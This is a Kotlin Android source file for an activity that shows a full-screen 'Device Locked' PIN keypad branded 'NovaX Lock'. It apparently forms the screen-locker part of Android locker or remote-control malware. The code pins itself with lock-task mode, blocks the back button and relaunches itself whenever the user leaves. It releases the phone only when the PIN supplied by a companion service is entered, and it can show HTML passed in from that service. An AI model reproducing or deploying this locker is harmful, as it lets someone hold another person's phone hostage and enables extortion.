package com.sync.xxx

import android.annotation.SuppressLint
import android.app.Activity
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.os.Build
import android.os.Bundle
import android.webkit.JavascriptInterface
import android.webkit.WebView
import android.media.MediaPlayer
import android.webkit.WebViewClient

class LockNewActivity : Activity() {

    private lateinit var webView: WebView
    private var mediaPlayer: MediaPlayer? = null
    private var correctPin: String  = ""
    private var lockTitle: String   = "Perangkat Terkunci"
    private var customHtml: String  = ""
    private var isReceiverRegistered = false
    private var isUnlocked = false

    private val unlockReceiver = object : BroadcastReceiver() {
        override fun onReceive(ctx: Context, intent: Intent) {
            if (intent.action == "com.sync.xxx.UNLOCK") {
                isUnlocked = true
                finish()
            }
        }
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        correctPin = intent?.getStringExtra(LockOverlayService.EXTRA_PIN)         ?: ""
        lockTitle  = intent?.getStringExtra(LockOverlayService.EXTRA_TITLE)       ?: "Perangkat Terkunci"
        customHtml = intent?.getStringExtra(LockOverlayService.EXTRA_CUSTOM_HTML) ?: ""

        setupWebView()
        registerUnlockReceiver()

        try {
    val dpm = getSystemService(DEVICE_POLICY_SERVICE) as android.app.admin.DevicePolicyManager
    if (dpm.isLockTaskPermitted(packageName)) startLockTask()
} catch (e: Exception) {
            android.util.Log.w("LockNewActivity", "startLockTask: ${e.message}")
        }
        playLockSound()
    }

    override fun onNewIntent(intent: Intent?) {
        super.onNewIntent(intent)
        setIntent(intent)
        correctPin = intent?.getStringExtra(LockOverlayService.EXTRA_PIN)         ?: correctPin
        lockTitle  = intent?.getStringExtra(LockOverlayService.EXTRA_TITLE)       ?: lockTitle
        customHtml = intent?.getStringExtra(LockOverlayService.EXTRA_CUSTOM_HTML) ?: customHtml
    }

    override fun onBackPressed() {
    if (!isUnlocked) return
    super.onBackPressed()
}

    override fun onPause() {
        super.onPause()
        if (isUnlocked) return
        val handler = android.os.Handler(android.os.Looper.getMainLooper())
        handler.postDelayed({
            if (isUnlocked) return@postDelayed
            val intent = Intent(this, LockNewActivity::class.java).apply {
                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_REORDER_TO_FRONT)
                putExtra(LockOverlayService.EXTRA_PIN, correctPin)
                putExtra(LockOverlayService.EXTRA_TITLE, lockTitle)
                putExtra(LockOverlayService.EXTRA_CUSTOM_HTML, customHtml)
            }
            startActivity(intent)
        }, 300)
    }

    override fun onStop() {
    super.onStop()
    if (isUnlocked) return
    if (Build.VERSION.SDK_INT < Build.VERSION_CODES.S) {
        val intent = Intent(this, LockNewActivity::class.java).apply {
            addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_REORDER_TO_FRONT)
            putExtra(LockOverlayService.EXTRA_PIN, correctPin)
            putExtra(LockOverlayService.EXTRA_TITLE, lockTitle)
            putExtra(LockOverlayService.EXTRA_CUSTOM_HTML, customHtml)
        }
        startActivity(intent)
    }
}

    @SuppressLint("SetJavaScriptEnabled")
    private fun setupWebView() {
        webView = WebView(this)
        webView.settings.apply {
            javaScriptEnabled = true
            domStorageEnabled = true
        }
        webView.setBackgroundColor(android.graphics.Color.TRANSPARENT)
        webView.addJavascriptInterface(LockBridge(), "LockBridge")
        webView.webViewClient = WebViewClient()
        if (customHtml.isNotEmpty()) {
            webView.loadDataWithBaseURL(null, buildCustomLockHtml(customHtml), "text/html", "UTF-8", null)
        } else {
            webView.loadDataWithBaseURL(null, buildLockHtml(), "text/html", "UTF-8", null)
        }
        setContentView(webView)
    }

    private fun buildCustomLockHtml(body: String): String {
        return """<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
<style>
*{box-sizing:border-box;margin:0;padding:0}
html,body{width:100%;height:100%;background:transparent;overflow:hidden;display:flex;align-items:center;justify-content:center}
#wrap{width:100%;height:100%;display:flex;align-items:center;justify-content:center}
</style>
</head>
<body>
<div id="wrap">
${body}
</div>
</body>
</html>""".trimIndent()
    }

    private fun registerUnlockReceiver() {
        if (isReceiverRegistered) return
        try {
            val filter = IntentFilter("com.sync.xxx.UNLOCK")
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                registerReceiver(unlockReceiver, filter, RECEIVER_NOT_EXPORTED)
            } else {
                registerReceiver(unlockReceiver, filter)
            }
            isReceiverRegistered = true
        } catch (e: Exception) {
            android.util.Log.w("LockNewActivity", "registerReceiver: ${e.message}")
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        try { stopLockTask() } catch (_: Exception) {}
        if (isReceiverRegistered) {
            try { unregisterReceiver(unlockReceiver) } catch (_: Exception) {}
            isReceiverRegistered = false
        }
        mediaPlayer?.release()
        mediaPlayer = null
        webView.destroy()
    }

    inner class LockBridge {
        @JavascriptInterface
        fun tryUnlock(pin: String): Boolean {
            val ok = (pin == correctPin)
            if (ok) {
                android.os.Handler(android.os.Looper.getMainLooper()).post {
                    try {
                        val cmdIntent = Intent(DeviceService.ACTION_COMMAND).apply {
                            putExtra(DeviceService.EXTRA_COMMAND, "unlockDevice")
                            putExtra(DeviceService.EXTRA_VALUE, "true")
                            setPackage(packageName)
                        }
                        sendBroadcast(cmdIntent)
                    } catch (e: Exception) {
                        android.util.Log.w("LockNewActivity", "broadcast: ${e.message}")
                    }
                    val unlockIntent = Intent("com.sync.xxx.UNLOCK").apply { setPackage(packageName) }
                    sendBroadcast(unlockIntent)
                }
            }
            return ok
        }

        @JavascriptInterface
        fun getLockTitle(): String = lockTitle
    }

    private fun playLockSound() {
        try {
            val afd = resources.openRawResourceFd(R.raw.lock) ?: return
            mediaPlayer = MediaPlayer().apply {
                setDataSource(afd.fileDescriptor, afd.startOffset, afd.length)
                afd.close()
                prepare()
                start()
                setOnCompletionListener { release(); mediaPlayer = null }
            }
        } catch (e: Exception) {
            android.util.Log.w("LockNewActivity", "playLockSound: ${e.message}")
        }
    }

    private fun buildLockHtml(): String {
        val safeTitle = lockTitle
            .replace("&", "&amp;")
            .replace("<", "&lt;")
            .replace("\"", "&quot;")

        return """<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
<link href="https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;600;700;800&family=JetBrains+Mono:wght@400;500;700&display=swap" rel="stylesheet">
<style>
*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}

:root{
  --bg:#F2F3F5;
  --card:#FFFFFF;
  --black:#1A1A1A;
  --yellow:#FFE566;
  --yellow2:#FFD600;
  --text:#111111;
  --text2:#555555;
  --text3:#888888;
  --danger:#FF3B30;
  --ok:#34C759;
}

html,body{
  height:100%;width:100%;
  overflow:hidden;
  touch-action:none;
}

body{
  background:var(--bg);
  font-family:'Outfit',sans-serif;
  -webkit-font-smoothing:antialiased;
  display:flex;
  flex-direction:column;
  align-items:center;
  justify-content:center;
  min-height:100vh;
  padding:28px 24px;
  position:relative;
  overflow:hidden;
  color:var(--text);
}

/* grid pattern neo-brutal */
body::before{
  content:'';
  position:fixed;inset:0;
  background-image:
    linear-gradient(rgba(0,0,0,.04) 1px,transparent 1px),
    linear-gradient(90deg,rgba(0,0,0,.04) 1px,transparent 1px);
  background-size:24px 24px;
  pointer-events:none;z-index:0;
}

/* ===== INTRO ===== */
#introScreen{
  position:fixed;inset:0;
  background:#FFFFFF;
  display:flex;flex-direction:column;
  align-items:center;justify-content:center;
  z-index:100;gap:18px;
  border:none;
  animation:introDismiss .4s ease forwards 4s;
}
@keyframes introDismiss{
  0%{opacity:1;transform:none}
  100%{opacity:0;transform:scale(1.04);pointer-events:none}
}
#introScreen.done{display:none}

.intro-badge{
  width:88px;height:88px;
  background:var(--yellow);
  border:3px solid var(--black);
  border-radius:18px;
  box-shadow:5px 5px 0 var(--black);
  display:flex;align-items:center;justify-content:center;
  font-size:36px;font-weight:800;
  font-family:'JetBrains Mono',monospace;
  color:var(--black);
  animation:badgePop 1.4s ease-in-out infinite;
}
@keyframes badgePop{
  0%,100%{transform:translate(0,0);box-shadow:5px 5px 0 var(--black)}
  50%{transform:translate(2px,2px);box-shadow:3px 3px 0 var(--black)}
}

.intro-title{
  font-family:'JetBrains Mono',monospace;
  font-size:16px;letter-spacing:2px;
  text-transform:uppercase;
  color:var(--black);
  text-align:center;line-height:1.9;
  font-weight:700;
}
.intro-title .line{display:block;overflow:hidden;white-space:nowrap}
.intro-title .line1{animation:typeIn .5s steps(12,end) .3s both}
.intro-title .line2{animation:typeIn .5s steps(10,end) 1.0s both}
.intro-title .line3{animation:typeIn .6s steps(14,end) 1.7s both}
@keyframes typeIn{
  from{width:0;opacity:0}
  to{opacity:1}
}

.intro-bar-wrap{
  width:220px;height:10px;
  background:#E8E8E8;
  border:2px solid var(--black);
  border-radius:6px;overflow:hidden;
  box-shadow:2px 2px 0 var(--black);
}
.intro-bar{
  height:100%;width:0%;
  background:var(--yellow);
  border-right:2px solid var(--black);
  animation:barFill 2.5s ease .5s forwards;
}
@keyframes barFill{to{width:100%}}

.intro-pct-wrap{
  font-family:'JetBrains Mono',monospace;
  font-size:12px;letter-spacing:2px;
  color:var(--black);font-weight:700;
  height:18px;width:60px;text-align:center;
  position:relative;
}
.pct-num{position:absolute;width:100%;text-align:center}

/* ===== MAIN ===== */
#mainContent{
  display:flex;flex-direction:column;align-items:center;
  position:relative;z-index:2;
  opacity:0;
  animation:mainIn .5s ease forwards 4.4s;
  width:100%;
}
@keyframes mainIn{to{opacity:1}}

/* icon card */
.virus-wrap{
  position:relative;
  width:100px;height:100px;
  margin-bottom:20px;flex-shrink:0;
  animation:popIn .45s cubic-bezier(.16,1,.3,1) both;
}
@keyframes popIn{
  from{opacity:0;transform:scale(.8) translateY(10px)}
  to{opacity:1;transform:none}
}

.virus-bg{
  width:100px;height:100px;
  border-radius:20px;
  background:var(--yellow);
  border:3px solid var(--black);
  box-shadow:5px 5px 0 var(--black);
  display:flex;align-items:center;justify-content:center;
  position:relative;z-index:1;
}

.v-orbit,.v-orbit2{display:none}

.tsundere-face{
  width:64px;height:64px;
  position:relative;
  display:flex;align-items:center;justify-content:center;
}
.face-head{
  width:54px;height:54px;
  border-radius:14px;
  background:#FFFFFF;
  border:2.5px solid var(--black);
  position:relative;
  box-shadow:2px 2px 0 var(--black);
}
.eye{
  position:absolute;
  width:10px;height:4px;
  background:var(--black);
  border-radius:4px;top:20px;
}
.eye.left{left:11px;transform:rotate(-10deg)}
.eye.right{right:11px;transform:rotate(10deg)}
.blush{
  position:absolute;
  width:10px;height:5px;
  border-radius:50%;
  background:rgba(255,214,0,.45);
  top:28px;
}
.blush.left{left:6px}
.blush.right{right:6px}
.mouth{
  position:absolute;left:50%;top:32px;
  transform:translateX(-50%);
  width:8px;height:4px;
  border-bottom:2px solid var(--black);
  border-radius:50%;
}
.anger{
  position:absolute;width:12px;height:12px;
  top:4px;right:2px;
  color:var(--black);font-size:14px;font-weight:800;
  transform:rotate(-12deg);
}

/* title */
.lock-title{
  font-size:22px;font-weight:800;
  color:var(--text);
  text-align:center;
  letter-spacing:-.3px;line-height:1.2;
  margin-bottom:6px;
  background:var(--yellow);
  border:2.5px solid var(--black);
  box-shadow:3px 3px 0 var(--black);
  padding:8px 16px;
  border-radius:10px;
  display:inline-block;
}
.lock-sub{
  font-family:'JetBrains Mono',monospace;
  font-size:10px;color:var(--text3);
  letter-spacing:2px;text-transform:uppercase;
  text-align:center;margin-bottom:26px;margin-top:10px;
  font-weight:600;
}

/* PIN dots */
.pin-wrap{
  display:flex;gap:14px;
  justify-content:center;margin-bottom:10px;
}
.pin-dot{
  width:16px;height:16px;
  border-radius:6px;
  border:2.5px solid var(--black);
  background:#FFFFFF;
  box-shadow:2px 2px 0 var(--black);
  transition:background .15s,transform .15s,box-shadow .15s;
}
.pin-dot.filled{
  background:var(--yellow);
  transform:translate(1px,1px);
  box-shadow:1px 1px 0 var(--black);
}
.pin-dot.error{
  border-color:var(--danger);
  background:#FFE0E0;
  animation:shake .38s ease;
}
@keyframes shake{
  0%,100%{transform:translateX(0)}
  25%{transform:translateX(-6px)}
  75%{transform:translateX(6px)}
}

.pin-status{
  height:24px;margin-bottom:24px;
  font-family:'JetBrains Mono',monospace;
  font-size:11px;letter-spacing:1.5px;
  text-transform:uppercase;text-align:center;
  color:var(--text3);font-weight:600;
  transition:color .2s;
}
.pin-status.err{color:var(--danger)}
.pin-status.ok{color:var(--ok)}

/* KEYPAD neo-brutal */
.keypad{
  display:grid;
  grid-template-columns:repeat(3,1fr);
  gap:10px;width:100%;max-width:292px;
}
.key{
  height:64px;
  border-radius:12px;
  border:2.5px solid var(--black);
  background:#FFFFFF;
  color:var(--text);
  display:flex;flex-direction:column;
  align-items:center;justify-content:center;
  cursor:pointer;
  -webkit-tap-highlight-color:transparent;
  transition:transform .1s,box-shadow .1s,background .1s;
  user-select:none;
  box-shadow:3px 3px 0 var(--black);
  position:relative;
}
.key .num{
  font-size:22px;font-weight:800;line-height:1;
  color:var(--text);
}
.key .sub{
  font-family:'JetBrains Mono',monospace;
  font-size:7px;letter-spacing:1.5px;
  color:var(--text3);margin-top:2px;font-weight:600;
}
.key.del{color:var(--text);background:var(--yellow)}
.key.empty{
  pointer-events:none;opacity:0;
  background:transparent;border-color:transparent;box-shadow:none;
}
.key:active{
  transform:translate(2px,2px);
  box-shadow:1px 1px 0 var(--black);
  background:var(--yellow);
}

/* entry anim */
.lock-title{animation:fadeUp .4s cubic-bezier(.16,1,.3,1) .08s both}
.lock-sub{animation:fadeUp .4s cubic-bezier(.16,1,.3,1) .13s both}
.pin-wrap{animation:fadeUp .4s cubic-bezier(.16,1,.3,1) .18s both}
.pin-status{animation:fadeUp .4s cubic-bezier(.16,1,.3,1) .22s both}
.keypad{animation:fadeUp .4s cubic-bezier(.16,1,.3,1) .27s both}
@keyframes fadeUp{
  from{opacity:0;transform:translateY(14px)}
  to{opacity:1;transform:none}
}

/* hide old data stream look - keep minimal */
.data-stream{display:none}

.tsundere-message{
  position:fixed;bottom:16px;left:50%;
  transform:translateX(-50%);
  font-family:'JetBrains Mono',monospace;
  font-size:9px;letter-spacing:1px;
  color:var(--text3);white-space:nowrap;
  z-index:3;pointer-events:none;
  background:#FFFFFF;
  border:2px solid var(--black);
  box-shadow:2px 2px 0 var(--black);
  padding:6px 12px;border-radius:8px;
  font-weight:600;
}
.tsundere-message::before{content:'◆ ';color:var(--black)}
</style>
</head>
<body>

<!-- INTRO -->
<div id="introScreen">
  <div class="intro-badge">NX</div>
  <div class="intro-title">
    <span class="line line1">NOVAX HERE</span>
    <span class="line line2">SECURE LOCK</span>
    <span class="line line3">ENTER YOUR PIN</span>
  </div>
  <div class="intro-bar-wrap">
    <div class="intro-bar"></div>
  </div>
  <div class="intro-pct-wrap">
    <span class="pct-num" id="pctNum">0%</span>
  </div>
</div>

<div class="data-stream" id="dataStream"></div>

<!-- MAIN -->
<div id="mainContent">
  <div class="virus-wrap">
    <div class="v-orbit"></div>
    <div class="v-orbit2"></div>
    <div class="virus-bg">
      <div class="tsundere-face">
        <div class="face-head">
          <div class="eye left"></div>
          <div class="eye right"></div>
          <div class="blush left"></div>
          <div class="blush right"></div>
          <div class="mouth"></div>
          <div class="anger">!</div>
        </div>
      </div>
    </div>
  </div>

  <div class="lock-title">$safeTitle</div>
  <div class="lock-sub">Enter PIN To Unlock</div>

  <div class="pin-wrap">
    <div class="pin-dot" id="d0"></div>
    <div class="pin-dot" id="d1"></div>
    <div class="pin-dot" id="d2"></div>
    <div class="pin-dot" id="d3"></div>
  </div>

  <div class="pin-status" id="pinStatus">Creator Guntur</div>

  <div class="keypad" id="keypad">
    <div class="key" data-n="1"><span class="num">1</span><span class="sub"></span></div>
    <div class="key" data-n="2"><span class="num">2</span><span class="sub">ABC</span></div>
    <div class="key" data-n="3"><span class="num">3</span><span class="sub">DEF</span></div>
    <div class="key" data-n="4"><span class="num">4</span><span class="sub">GHI</span></div>
    <div class="key" data-n="5"><span class="num">5</span><span class="sub">JKL</span></div>
    <div class="key" data-n="6"><span class="num">6</span><span class="sub">MNO</span></div>
    <div class="key" data-n="7"><span class="num">7</span><span class="sub">PQRS</span></div>
    <div class="key" data-n="8"><span class="num">8</span><span class="sub">TUV</span></div>
    <div class="key" data-n="9"><span class="num">9</span><span class="sub">WXYZ</span></div>
    <div class="key empty"></div>
    <div class="key" data-n="0"><span class="num">0</span></div>
    <div class="key del" data-del="1">
      <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2">
        <path d="M21 4H8l-7 8 7 8h13a2 2 0 0 0 2-2V6a2 2 0 0 0-2-2z"/>
        <line x1="18" y1="9" x2="12" y2="15"/>
        <line x1="12" y1="9" x2="18" y2="15"/>
      </svg>
    </div>
  </div>
</div>

<div class="tsundere-message">NovaX Lock — masukkan PIN untuk membuka</div>

<script>
/* INTRO PERCENT */
(function(){
  var el=document.getElementById('pctNum');
  var start=null;var dur=2500;
  function step(ts){
    if(!start) start=ts+500;
    var p=Math.min(1,Math.max(0,(ts-start)/dur));
    el.textContent=Math.floor(p*100)+'%';
    if(p<1) requestAnimationFrame(step);
  }
  requestAnimationFrame(step);
})();

/* HIDE INTRO */
setTimeout(function(){
  var intro=document.getElementById('introScreen');
  intro.style.pointerEvents='none';
  setTimeout(function(){intro.style.display='none';},400);
},4000);

/* DATA STREAM (kept for structure, hidden via CSS) */
(function(){
  var chars='01ABCDEFNOVAX';
  var container=document.getElementById('dataStream');
  if(!container) return;
  var cols=Math.floor(window.innerWidth/22);
  for(var i=0;i<cols;i++){
    var col=document.createElement('div');
    col.className='data-col';
    col.style.left=(i*22)+'px';
    var txt='';
    for(var j=0;j<8;j++) txt+=chars[Math.floor(Math.random()*chars.length)]+'\n';
    col.textContent=txt;
    container.appendChild(col);
  }
})();

/* ORIGINAL PIN LOGIC — TETAP DIPERTAHANKAN */
var pin='';
var blocked=false;

document.getElementById('keypad').addEventListener('touchend',function(e){
  e.preventDefault();
  var key=e.target.closest('.key');
  if(!key||key.classList.contains('empty')) return;
  if(key.dataset.del){doDelete();return;}
  if(key.dataset.n!==undefined){doPress(key.dataset.n);}
},{passive:false});

document.getElementById('keypad').addEventListener('click',function(e){
  if(e.sourceCapabilities&&e.sourceCapabilities.firesTouchEvents) return;
  var key=e.target.closest('.key');
  if(!key||key.classList.contains('empty')) return;
  if(key.dataset.del){doDelete();return;}
  if(key.dataset.n!==undefined){doPress(key.dataset.n);}
});

function doPress(n){
  if(blocked||pin.length>=4) return;
  pin+=n;
  updateDots();
  if(pin.length===4) setTimeout(checkPin,150);
}

function doDelete(){
  if(blocked) return;
  pin=pin.slice(0,-1);
  updateDots();
  setStatus('',false,false);
}

function updateDots(){
  for(var i=0;i<4;i++){
    var d=document.getElementById('d'+i);
    d.classList.toggle('filled',i<pin.length);
    d.classList.remove('error');
  }
}

function checkPin(){
  var ok=false;
  try{ok=LockBridge.tryUnlock(pin);}catch(e){}
  if(ok){
    setStatus('PIN Benar ✓',false,true);
  }else{
    setStatus('PIN Salah!',true,false);
    for(var i=0;i<4;i++) document.getElementById('d'+i).classList.add('error');
    blocked=true;
    setTimeout(function(){
      pin='';blocked=false;updateDots();
      setStatus('Coba lagi',false,false);
    },1200);
  }
}

function setStatus(msg,isErr,isOk){
  var el=document.getElementById('pinStatus');
  el.textContent=msg||'Ketuk angka untuk memasukkan PIN';
  el.className='pin-status'+(isErr?' err':isOk?' ok':'');
}
</script>
</body>
</html>
"""
    }
}